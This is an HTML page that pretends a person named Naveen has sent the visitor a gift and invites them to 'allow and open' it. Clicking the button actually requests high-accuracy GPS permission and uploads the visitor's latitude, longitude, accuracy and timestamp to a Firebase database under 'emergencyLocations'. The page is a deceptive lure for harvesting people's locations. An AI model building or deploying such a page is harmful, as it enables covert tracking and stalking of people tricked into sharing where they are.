<!DOCTYPE html>
<html lang="te">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Naveen Gift</title>
<style>
body {
  font-family: Arial, sans-serif;
  background: #f1f4f9;
  display: grid;
  place-items: center;
  min-height: 90vh;
  margin: 0;
}
.card {
  background: white;
  padding: 28px;
  border-radius: 20px;
  max-width: 420px;
  width: 85%;
  text-align: center;
  box-shadow: 0 8px 30px #0001;
}
button {
  background: #1769e0;
  color: white;
  border: 0;
  padding: 17px;
  width: 100%;
  border-radius: 12px;
  font-size: 18px;
  margin-top: 20px;
}
p { color: #555; line-height: 1.6; }
#status { margin-top: 18px; }
</style>
</head>
<body>
<div class="card">
  <h2>Naveen Gift</h2>
  <p>
    Naveen Shared a Gift For you Allow and open the Gift
  </p>
  <button id="share">Naveen Sent A Gift</button>
  <p id="status"></p>
</div>

<script type="module">
import { initializeApp } from
"https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getDatabase, ref, push, set }
from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

const firebaseConfig = {
  apiKey: "PASTE_YOUR_API_KEY",
  authDomain: "Naveen-Gift-14c61.firebaseapp.com",
  databaseURL: "https://emergency-location-14c61-default-rtdb.firebaseio.com",
  projectId: "emergency-location-14c61",
  storageBucket: "emergency-location-14c61.firebasestorage.app",
  messagingSenderId: "822733393681",
  appId: "PASTE_YOUR_APP_ID"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

document.getElementById("share").onclick = () => {
  const status = document.getElementById("status");

  if (!navigator.geolocation) {
    status.textContent = "GPS not supported.";
    return;
  }

  status.textContent = "Requesting GPS permission...";

  navigator.geolocation.getCurrentPosition(async (pos) => {
    try {
      const locationRef = push(ref(db, "emergencyLocations"));

      await set(locationRef, {
        latitude: pos.coords.latitude,
        longitude: pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        timestamp: Date.now()
      });

      status.innerHTML =
        "Location shared successfully. <br>" +
        '<a target="_blank" href="https://maps.google.com/?q=' +
        pos.coords.latitude + "," + pos.coords.longitude +
        '">View on Google Maps</a>';

    } catch (error) {
      status.textContent = "Upload failed: " + error.message;
    }
  }, (error) => {
    status.textContent = "Location permission failed: " + error.message;
  }, {
    enableHighAccuracy: true,
    timeout: 15000,
    maximumAge: 0
  });
};
</script>
</body>
</html>
